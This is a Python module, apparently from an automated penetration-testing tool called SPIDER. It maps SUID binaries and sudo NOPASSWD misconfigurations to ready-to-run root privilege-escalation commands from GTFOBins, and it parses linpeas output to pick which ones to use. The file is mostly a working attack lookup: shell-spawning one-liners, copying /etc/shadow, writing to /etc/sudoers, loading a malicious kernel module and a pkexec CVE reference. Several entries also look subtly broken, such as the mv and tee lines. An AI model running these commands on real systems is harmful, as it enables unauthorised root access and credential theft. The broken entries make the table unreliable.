"""
SPIDER — GTFOBins SUID Privilege Escalation Lookup
Maps SUID binaries to shell commands that achieve root via GTFOBins.
"""

from __future__ import annotations

import re


# SUID binary → GTFOBins escalation command
SUID_PRIVESC: dict[str, str] = {
    "/bin/bash":           "bash -p",
    "/usr/bin/bash":       "bash -p",
    "/bin/sh":             "sh -p",
    "/usr/bin/sh":         "sh -p",
    "/usr/bin/find":       "find . -exec /bin/sh -p \\; -quit",
    "/usr/bin/vim":        "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "/usr/bin/vi":         "vi -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'",
    "/usr/bin/nmap":       "nmap --interactive  # then: !sh",
    "/usr/bin/python":     "python -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "/usr/bin/python3":    "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
    "/usr/bin/perl":       "perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec \"/bin/bash\";'",
    "/usr/bin/ruby":       "ruby -e 'Process::Sys.setuid(0); exec \"/bin/bash\"'",
    "/usr/bin/awk":        "awk 'BEGIN {system(\"/bin/sh -p\")}'",
    "/usr/bin/gawk":       "gawk 'BEGIN {system(\"/bin/sh -p\")}'",
    "/usr/bin/less":       "less /etc/profile  # then: !bash -p",
    "/usr/bin/more":       "more /etc/profile  # then: !/bin/sh",
    "/usr/bin/man":        "man man  # then: !bash -p",
    "/usr/bin/tar":        "tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh",
    "/usr/bin/cp":         "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash && /tmp/rootbash -p",
    "/usr/bin/mv":         "mv /bin/cp /tmp/ && cp /bin/bash /tmp/rootbash",
    "/usr/bin/env":        "env /bin/sh -p",
    "/usr/bin/node":       "node -e 'require(\"child_process\").spawn(\"/bin/sh\", [\"-p\"], {stdio: [0, 1, 2]})'",
    "/usr/bin/curl":       "curl file:///etc/passwd",
    "/usr/bin/dd":         "dd if=/etc/shadow of=/tmp/shadow_copy",
    "/usr/bin/tee":        "echo '' | tee -a /etc/sudoers",
    "/usr/bin/pkexec":     "pkexec /bin/bash  # CVE-2021-4034",
    "/sbin/insmod":        "insmod <malicious_module.ko>",
    "/usr/sbin/apache2":   "apache2 -f /etc/shadow",
}

# Sudo misconfig patterns
SUDO_PRIVESC: dict[str, str] = {
    "find":    "sudo find . -exec /bin/sh \\; -quit",
    "vim":     "sudo vim -c ':!/bin/sh'",
    "nmap":    "sudo nmap --interactive  # !sh",
    "python":  "sudo python -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "python3": "sudo python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
    "perl":    "sudo perl -e 'exec \"/bin/bash\";'",
    "bash":    "sudo bash",
    "sh":      "sudo sh",
    "less":    "sudo less /etc/profile  # !bash",
    "more":    "sudo more /etc/profile  # !/bin/sh",
    "env":     "sudo env /bin/sh",
    "awk":     "sudo awk 'BEGIN {system(\"/bin/bash\")}'",
    "man":     "sudo man man  # !bash",
}


def lookup_suid(binary_path: str) -> str | None:
    """
    Return GTFOBins command for a given SUID binary path.
    Checks exact match first, then basename match.
    
    Returns:
        Command string, or None if no known escalation.
    """
    # Exact match
    if binary_path in SUID_PRIVESC:
        return SUID_PRIVESC[binary_path]

    # Basename match (handle path variants)
    import os
    basename = os.path.basename(binary_path)
    for path, cmd in SUID_PRIVESC.items():
        if os.path.basename(path) == basename:
            return cmd

    return None


def parse_suid_binaries(linpeas_output: str) -> list[str]:
    """
    Extract SUID binary paths from linpeas output.
    Looks for lines matching SUID binary patterns.
    
    Returns:
        List of absolute binary paths with SUID bit set.
    """
    suid_paths = []

    # Pattern: lines with -rwsr or -r-sr (SUID set)
    suid_pattern = re.compile(
        r"-(?:rws|r-s|rwS|r-S)[^\s]*\s+.*?(/(?:usr/)?(?:bin|sbin)/\S+)"
    )

    # Also match "find / -perm /4000" style output
    find_pattern = re.compile(r"(/(?:usr/)?(?:bin|sbin|local/bin)/\S+)")

    for line in linpeas_output.splitlines():
        # SUID from permissions listing
        m = suid_pattern.search(line)
        if m:
            suid_paths.append(m.group(1))
            continue
        # From find output lines starting with /
        if line.strip().startswith("/") and ("suid" in line.lower() or "4000" in line):
            m2 = find_pattern.search(line)
            if m2:
                suid_paths.append(m2.group(1))

    return list(set(suid_paths))


def parse_sudo_misconfigs(linpeas_output: str) -> list[dict]:
    """
    Extract sudo misconfigurations from linpeas output.
    Looks for lines like: (root) NOPASSWD: /usr/bin/vim
    
    Returns:
        List of {binary, command, run_as} dicts.
    """
    misconfigs = []
    sudo_pattern = re.compile(
        r"\((\w+)\)\s+NOPASSWD:\s+(/\S+)"
    )
    for m in sudo_pattern.finditer(linpeas_output):
        run_as = m.group(1)
        binary = m.group(2)
        binary_name = binary.split("/")[-1]
        cmd = SUDO_PRIVESC.get(binary_name)
        misconfigs.append({
            "binary": binary,
            "run_as": run_as,
            "command": cmd or f"sudo {binary}",
        })
    return misconfigs
